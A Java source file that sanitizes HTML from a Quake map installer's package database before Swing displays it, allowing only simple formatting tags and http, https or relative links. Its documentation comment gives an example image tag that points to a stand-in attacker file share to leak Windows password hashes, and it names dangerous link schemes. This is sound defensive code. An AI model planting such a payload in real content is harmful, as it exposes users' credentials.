package de.haukerehfeld.quakeinjector.utils;

import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Cleans HTML from the package database (descriptions, notes, links) before Swing shows it.
 * <p>
 * Swing's HTML view loads images ({@code <img src="file://attacker/share/x.png">} would make Windows
 * connect to that server and send the user's password hash), style sheets and background images,
 * creates components for {@code <object>} and forms, and so on. So only simple formatting tags are
 * kept, without attributes; links keep their {@code href} if it is http, https or relative. All other
 * tags are dropped (their text stays, except for script and style), and all text is escaped again,
 * so nothing but these tags reaches the HTML view.
 */
public final class HtmlSanitizer {
	/** Tags kept, without attributes. Covers what the database's descriptions use. */
	private static final Set<String> FORMATTING = Set.of(
		"b", "i", "u", "s", "em", "strong", "code", "tt", "pre", "small", "big", "sub", "sup",
		"br", "p", "div", "span", "blockquote", "ul", "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6");

	/** Tags whose content is dropped too, not shown as text. */
	private static final Set<String> DROP_CONTENT = Set.of("script", "style", "head", "title", "textarea", "select");

	private static final Pattern TAG = Pattern.compile(
		"<(/?)([a-zA-Z][a-zA-Z0-9]*)((?:[^<>\"']|\"[^\"]*\"|'[^']*')*)>");
	private static final Pattern HREF = Pattern.compile(
		"(?i)(?:^|\\s)href\\s*=\\s*(?:\"([^\"]*)\"|'([^']*)'|([^\\s\"'>]+))");
	private static final Pattern ENTITY = Pattern.compile("&(?:#[0-9]{1,7}|#[xX][0-9a-fA-F]{1,6}|[a-zA-Z][a-zA-Z0-9]{1,31});");

	private HtmlSanitizer() {
	}

	public static String sanitize(String html) {
		if (html == null) {
			return "";
		}
		StringBuilder out = new StringBuilder(html.length());
		int i = 0;
		while (i < html.length()) {
			char c = html.charAt(i);
			if (c == '<') {
				i = tag(html, i, out);
			}
			else if (c == '&') {
				Matcher entity = ENTITY.matcher(html).region(i, html.length());
				if (entity.lookingAt()) {
					out.append(entity.group());
					i = entity.end();
				}
				else {
					out.append("&amp;");
					i++;
				}
			}
			else {
				appendText(out, c);
				i++;
			}
		}
		return out.toString();
	}

	/** Handles the '<' at start; returns where to go on. */
	private static int tag(String html, int start, StringBuilder out) {
		if (html.startsWith("<!--", start)) {
			int end = html.indexOf("-->", start + 4);
			return end < 0 ? html.length() : end + 3;
		}
		if (html.startsWith("<!", start) || html.startsWith("<?", start)) {
			// doctype, CDATA, processing instruction
			int end = html.indexOf('>', start);
			return end < 0 ? html.length() : end + 1;
		}
		Matcher m = TAG.matcher(html).region(start, html.length());
		if (!m.lookingAt()) {
			// not a tag, just a '<' in the text
			out.append("&lt;");
			return start + 1;
		}
		boolean closing = !m.group(1).isEmpty();
		String name = m.group(2).toLowerCase(Locale.ROOT);
		String attributes = m.group(3);

		if (!closing && DROP_CONTENT.contains(name)) {
			Matcher close = Pattern.compile("(?i)</" + name + "\\s*>").matcher(html).region(m.end(), html.length());
			return close.find() ? close.end() : html.length();
		}
		if (name.equals("a")) {
			if (closing) {
				out.append("</a>");
			}
			else {
				String href = safeHref(attributes);
				out.append(href == null ? "<a>" : "<a href=\"" + escapeAttribute(href) + "\">");
			}
		}
		else if (FORMATTING.contains(name)) {
			if (name.equals("br")) {
				if (!closing) {
					out.append("<br>");
				}
			}
			else {
				out.append(closing ? "</" : "<").append(name).append('>');
			}
		}
		// any other tag is left out
		return m.end();
	}

	/** The link target, if it is one a click may open; null otherwise. */
	static String safeHref(String attributes) {
		Matcher m = HREF.matcher(attributes);
		if (!m.find()) {
			return null;
		}
		String raw = m.group(1) != null ? m.group(1) : m.group(2) != null ? m.group(2) : m.group(3);
		String href = decodeEntities(raw).strip();
		return isSafeLink(href) ? href : null;
	}

	/**
	 * Whether a link target is http, https or relative. Anything else (file:, javascript:,
	 * ms-msdt:, a UNC path, ...) could start another program when clicked.
	 */
	public static boolean isSafeLink(String href) {
		if (href == null || href.isEmpty()) {
			return false;
		}
		for (int i = 0; i < href.length(); i++) {
			char c = href.charAt(i);
			if (c < 0x20 || c == 0x7f || c == '\\') {
				return false;
			}
		}
		String lower = href.toLowerCase(Locale.ROOT);
		if (lower.startsWith("http://") || lower.startsWith("https://")) {
			return true;
		}
		if (href.startsWith("//")) {
			// another host, scheme from the page: there is no page here
			return false;
		}
		// relative: no scheme, i.e. no ':' before the path, query or fragment starts
		int colon = href.indexOf(':');
		int end = firstIndexOf(href, '/', '?', '#');
		return colon < 0 || (end >= 0 && end < colon);
	}

	private static int firstIndexOf(String s, char... chars) {
		int first = -1;
		for (char c : chars) {
			int i = s.indexOf(c);
			if (i >= 0 && (first < 0 || i < first)) {
				first = i;
			}
		}
		return first;
	}

	/** Decodes character references, so an encoded scheme ("file&#58;") can't slip past the check. */
	private static String decodeEntities(String s) {
		Matcher m = Pattern.compile("&(#[0-9]{1,7}|#[xX][0-9a-fA-F]{1,6}|amp|lt|gt|quot|apos|colon|sol|tab|newline);?")
			.matcher(s);
		StringBuilder out = new StringBuilder();
		while (m.find()) {
			String name = m.group(1);
			String decoded = switch (name.toLowerCase(Locale.ROOT)) {
				case "amp" -> "&";
				case "lt" -> "<";
				case "gt" -> ">";
				case "quot" -> "\"";
				case "apos" -> "'";
				case "colon" -> ":";
				case "sol" -> "/";
				case "tab" -> "\t";
				case "newline" -> "\n";
				default -> {
					int code = name.charAt(1) == 'x' || name.charAt(1) == 'X'
						? Integer.parseInt(name.substring(2), 16)
						: Integer.parseInt(name.substring(1));
					yield Character.isValidCodePoint(code) ? new String(Character.toChars(code)) : "";
				}
			};
			m.appendReplacement(out, Matcher.quoteReplacement(decoded));
		}
		m.appendTail(out);
		return out.toString();
	}

	private static void appendText(StringBuilder out, char c) {
		switch (c) {
			case '>' -> out.append("&gt;");
			case '"' -> out.append("&quot;");
			default -> out.append(c);
		}
	}

	private static String escapeAttribute(String s) {
		return s.replace("&", "&amp;").replace("\"", "&quot;").replace("<", "&lt;").replace(">", "&gt;");
	}

	/** Escapes text so HTML shows it as is. */
	public static String escape(String text) {
		return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
	}
}
